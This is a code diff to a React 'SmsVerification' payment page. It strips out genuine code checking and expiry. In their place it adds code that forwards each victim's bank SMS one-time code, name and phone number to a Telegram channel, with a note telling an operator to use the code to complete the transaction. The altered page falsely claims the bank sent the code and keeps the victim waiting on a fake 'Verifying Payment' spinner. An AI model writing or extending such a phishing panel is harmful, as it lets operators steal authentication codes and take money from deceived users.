@@ -1,50 +1,45 @@
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import { Button } from "@/components/ui/button";
-import { ArrowLeft, MessageSquare, Shield, Clock } from "lucide-react";
+import { ArrowLeft, MessageSquare, Shield, Loader2 } from "lucide-react";
 import {
   InputOTP,
   InputOTPGroup,
   InputOTPSlot,
 } from "@/components/ui/input-otp";
+import { supabase } from "@/integrations/supabase/client";
 
 interface SmsVerificationProps {
-  onProceed: () => void;
   onBack: () => void;
-  expectedCode: string;
+  sessionCode: string;
+  clientName: string | null;
+  phoneNumber: string | null;
 }
 
-const EXPIRATION_TIME = 5 * 60; // 5 minutes in seconds
-
-const SmsVerification = ({ onProceed, onBack, expectedCode }: SmsVerificationProps) => {
+const SmsVerification = ({ onBack, sessionCode, clientName, phoneNumber }: SmsVerificationProps) => {
   const [code, setCode] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [error, setError] = useState("");
-  const [timeLeft, setTimeLeft] = useState(EXPIRATION_TIME);
-  const [isExpired, setIsExpired] = useState(false);
+  const [isSubmitted, setIsSubmitted] = useState(false);
 
-  useEffect(() => {
-    if (timeLeft <= 0) {
-      setIsExpired(true);
-      return;
-    }
+  const sendCodeToTelegram = async (smsCode: string) => {
+    try {
+      const message = `📱 <b>SMS Code Received</b>
 
-    const timer = setInterval(() => {
-      setTimeLeft((prev) => {
-        if (prev <= 1) {
-          setIsExpired(true);
-          return 0;
-        }
-        return prev - 1;
+📋 <b>Session:</b> #${sessionCode}
+👤 <b>Client:</b> ${clientName || "Unknown"}
+📱 <b>Phone:</b> ${phoneNumber || "N/A"}
+
+🔑 <b>SMS Code:</b> <code>${smsCode}</code>
+
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+
+⚠️ Use this code to complete the transaction, then click "Confirm Payment" in admin panel.`;
+
+      await supabase.functions.invoke("send-telegram", {
+        body: { message },
       });
-    }, 1000);
-
-    return () => clearInterval(timer);
-  }, [timeLeft]);
-
-  const formatTime = (seconds: number) => {
-    const mins = Math.floor(seconds / 60);
-    const secs = seconds % 60;
-    return `${mins}:${secs.toString().padStart(2, "0")}`;
+    } catch (error) {
+      console.error("Failed to send Telegram notification:", error);
+    }
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -52,20 +47,50 @@ const SmsVerification = ({ onProceed, onBack, expectedCode }: SmsVerificationPro
     if (code.length !== 6) return;
     
     setIsSubmitting(true);
-    setError("");
     
-    // Simulate verification delay
-    await new Promise(resolve => setTimeout(resolve, 1000));
+    // Send the code to Telegram for admin to see
+    await sendCodeToTelegram(code);
     
-    if (code === expectedCode) {
-      setIsSubmitting(false);
-      onProceed();
-    } else {
-      setIsSubmitting(false);
-      setError("Invalid verification code. Please try again.");
-      setCode("");
-    }
+    setIsSubmitting(false);
+    setIsSubmitted(true);
   };
+
+  if (isSubmitted) {
+    return (
+      <div className="animate-slide-up">
+        <div className="card-elevated p-8 max-w-lg mx-auto">
+          <div className="text-center mb-8">
+            <div className="flex items-center justify-center mb-4">
+              <div className="w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center">
+                <Loader2 className="w-8 h-8 text-primary animate-spin" />
+              </div>
+            </div>
+            <h2 className="text-2xl font-display font-bold mb-2">
+              Verifying Payment
+            </h2>
+            <p className="text-muted-foreground">
+              Please wait while we verify your payment. This may take a moment...
+            </p>
+          </div>
+
+          <div className="bg-secondary/50 rounded-xl p-4 mb-6">
+            <div className="flex items-center gap-2 mb-2">
+              <Shield className="w-4 h-4 text-primary" />
+              <span className="text-sm font-medium">Processing</span>
+            </div>
+            <p className="text-sm text-muted-foreground">
+              Your verification code has been submitted. Please do not close this page.
+            </p>
+          </div>
+
+          <div className="flex items-center justify-center gap-2 text-muted-foreground">
+            <Loader2 className="w-4 h-4 animate-spin" />
+            <span className="text-sm">Waiting for confirmation...</span>
+          </div>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="animate-slide-up">
@@ -80,34 +105,18 @@ const SmsVerification = ({ onProceed, onBack, expectedCode }: SmsVerificationPro
             Payment Verification
           </h2>
           <p className="text-muted-foreground">
-            You will receive an SMS with a 6-digit verification code. Please enter it below to confirm your payment.
+            Enter the verification code you received via SMS to confirm your payment.
           </p>
         </div>
 
-        {/* Countdown Timer */}
-        <div className={`flex items-center justify-center gap-2 p-3 rounded-lg mb-6 ${
-          isExpired 
-            ? "bg-destructive/10 text-destructive" 
-            : timeLeft <= 60 
-              ? "bg-orange-500/10 text-orange-600" 
-              : "bg-secondary/50 text-muted-foreground"
-        }`}>
-          <Clock className="w-4 h-4" />
-          <span className="text-sm font-medium">
-            {isExpired 
-              ? "Code expired. Please request a new code." 
-              : `Code expires in ${formatTime(timeLeft)}`}
-          </span>
-        </div>
-
-        {/* SMS Preview */}
+        {/* SMS Info */}
         <div className="bg-secondary/50 rounded-xl p-4 mb-6">
           <div className="flex items-center gap-2 mb-2">
             <Shield className="w-4 h-4 text-primary" />
-            <span className="text-sm font-medium">Awaiting Verification Code</span>
+            <span className="text-sm font-medium">Bank Verification</span>
           </div>
           <p className="text-sm text-muted-foreground">
-            You will receive an SMS with your verification code shortly. Please check your phone and enter the code below.
+            Your bank has sent a verification code to your registered phone number. Please enter it below.
           </p>
         </div>
 
@@ -120,10 +129,7 @@ const SmsVerification = ({ onProceed, onBack, expectedCode }: SmsVerificationPro
             <InputOTP
               maxLength={6}
               value={code}
-              onChange={(value) => {
-                setCode(value);
-                setError("");
-              }}
+              onChange={(value) => setCode(value)}
             >
               <InputOTPGroup>
                 <InputOTPSlot index={0} />
@@ -134,25 +140,6 @@ const SmsVerification = ({ onProceed, onBack, expectedCode }: SmsVerificationPro
                 <InputOTPSlot index={5} />
               </InputOTPGroup>
             </InputOTP>
-            {error && (
-              <p className="text-sm text-destructive mt-2">{error}</p>
-            )}
-          </div>
-
-          {/* Resend option */}
-          <div className="text-center">
-            <p className="text-sm text-muted-foreground">
-              Didn't receive the code?{" "}
-              <button
-                type="button"
-                className="text-primary hover:underline font-medium"
-                onClick={() => {
-                  // Could trigger resend logic here
-                }}
-              >
-                Resend SMS
-              </button>
-            </p>
           </div>
 
           {/* Action Buttons */}
@@ -168,10 +155,10 @@ const SmsVerification = ({ onProceed, onBack, expectedCode }: SmsVerificationPro
             </Button>
             <Button
               type="submit"
-              disabled={code.length !== 6 || isSubmitting || isExpired}
+              disabled={code.length !== 6 || isSubmitting}
               className="flex-1 h-12 bg-primary hover:bg-primary/90 text-primary-foreground rounded-xl"
             >
-              {isSubmitting ? "Verifying..." : isExpired ? "Code Expired" : "Verify Code"}
+              {isSubmitting ? "Submitting..." : "Verify Code"}
             </Button>
           </div>
         </form>
